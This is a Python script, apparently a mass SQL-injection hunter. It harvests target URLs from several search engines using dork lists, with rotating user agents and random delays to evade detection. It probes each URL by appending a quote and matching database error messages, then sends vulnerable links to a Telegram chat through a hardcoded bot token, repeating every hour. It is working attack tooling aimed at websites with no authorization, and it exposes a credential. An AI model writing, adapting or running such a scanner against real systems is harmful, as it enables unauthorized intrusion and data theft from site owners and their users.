from keep_alive import keep_alive
keep_alive()

import requests
import re
import time
import random
from urllib.parse import quote_plus, urlparse
from telebot import TeleBot

TOKEN   = "8054578360:AAE4-PAEetO-XSSU3-7cTCEEsGZ0MUOp78w"
CHAT_ID = "7856736153"
bot = TeleBot(TOKEN, threaded=False)

ENGINES = {
    "bing":      "https://www.bing.com/search?q={q}&first={start}",
    "brave":     "https://search.brave.com/search?q={q}&offset={start}",
    "qwant":     "https://www.qwant.com/?q={q}&t=web&offset={start}",
    "swisscows": "https://swisscows.com/en/web?query={q}&page={start}"
}
PAGES_EACH = 60

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 Chrome/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4) AppleWebKit/605.1.15 Mobile/15E148"
]
HEADERS = lambda: {"User-Agent": random.choice(USER_AGENTS)}
def sleep_random(min_sec=2.0, max_sec=4.0): time.sleep(random.uniform(min_sec, max_sec))

BANNED_DOMAINS = {...}
BANNED_KEYWORDS = {...}
BANNED_EXTS = ('.jpg','.jpeg','.png','.svg','.gif','.ico','.css','.js','.woff','.ttf','.eot','.pdf','.doc','.xls','.zip','.rar','.exe','.mp4','.mp3','.avi','.mov')
ERROR_SIGNS = ('sql syntax','mysql_fetch','you have an error','odbc sql','pdoexception','unclosed quotation')

def is_valid(url): url_l = url.lower(); return all([
    "id=" in url_l,
    not any(url_l.endswith(ext) for ext in BANNED_EXTS),
    not any(k in url_l for k in BANNED_KEYWORDS),
    not any(dom in urlparse(url).netloc.lower() for dom in BANNED_DOMAINS)
])

def load_dorks(path="sqli_dorks.txt"):
    try: return [ln.strip() for ln in open(path, encoding="utf-8") if ln.strip()]
    except FileNotFoundError: print("[!] السجل غير موجود."); return []

def search_dork(dork):
    q, out = quote_plus(dork), []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            start_val = page * 10 + 1 if name == "bing" else (page + 1 if name == "swisscows" else page * 10)
            url = tmpl.format(q=q, start=start_val)
            sleep_random()
            try: out += re.findall(r'https?://[\w./%-_?=&#+]+', requests.get(url, headers=HEADERS(), timeout=10).text)
            except Exception as e: print(f"[*] {name} خطأ: {e}")
    return out

def test_sqli(url):
    try: return any(sig in requests.get(url + "'", headers=HEADERS(), timeout=8).text.lower() for sig in ERROR_SIGNS)
    except: return False

def send_batch_report(batch_id, scanned, infected_links):
    bot.send_message(CHAT_ID, f"[*] Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}")
    for link in infected_links: bot.send_message(CHAT_ID, f"[!] SQLi: {link}")

def run_cycle():
    dorks = load_dorks()
    if not dorks: return
    print("[] بدء الجمع …")
    batch_id = 1
    current_pool = []
    for dork in dorks:
        print(f"[+] dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean) or clean in current_pool: continue
            current_pool.append(clean)
            if len(current_pool) == 30:
                print(f"[] Batch #{batch_id} – فحص 30 رابط ...")
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1; current_pool.clear()
    if current_pool:
        print(f"[] Batch #{batch_id} – فحص {len(current_pool)} رابط ...")
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)
    bot.send_message(CHAT_ID, "[] الدورة اكتملت. انتظار ساعة لإعادة التشغيل.")

if __name__ == "__main__":
    while True:
        print("[] تشغيل جديد ...")
        run_cycle()
        print("[] نوم 1 ساعة ...")
        time.sleep(3600)
